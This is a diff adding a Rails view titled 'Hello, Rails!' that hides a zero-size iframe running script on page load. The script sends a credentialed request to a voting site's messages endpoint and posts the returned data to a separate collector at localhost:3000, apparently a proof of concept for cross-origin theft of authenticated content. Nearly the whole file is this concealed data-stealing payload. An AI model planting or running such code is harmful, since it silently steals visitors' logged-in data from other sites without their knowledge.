@@ -1,0 +1,45 @@
+<h1>Hello, Rails!</h1>
+
+<html>
+  <body>
+    <iframe id="access_response" width="0" height="0" src="data:text/html,
+      <script> 
+	function makeRequestOne(){
+	  var xhr = new XMLHttpRequest();
+	  
+	  xhr.open('GET', 'http://voting.na.nccgroup.com:8000/messages/', true);
+	  xhr.withCredentials = 'true';
+	  xhr.send(null);
+	  
+	  xhr.onreadystatechange = function() {
+	    if (xhr.readyState == 4) {
+	      console.log('request one complete, starting request two');
+	      
+	      var response = xhr.responseText;
+	      makeRequestTwo(response);
+	    }
+	  }
+	}
+	
+	function makeRequestTwo(response) {
+	  var xhr = new XMLHttpRequest();
+	  
+	  xhr.open('POST', 'http://localhost:3000/responses/', true);
+	  xhr.withCredentials = 'true';
+	  
+	  xhr.send(response);
+	  console.log(response);
+
+	  xhr.onreadystatechange = function() {
+	    if (xhr.readyState == 4) {
+	      console.log('request two complete');
+	    }
+	  }
+	}	
+	makeRequestOne();
+      </script>">
+    </iframe>
+    <div class="show_response">Hello<span id="something"></span></div>
+  </body>
+</html>
+
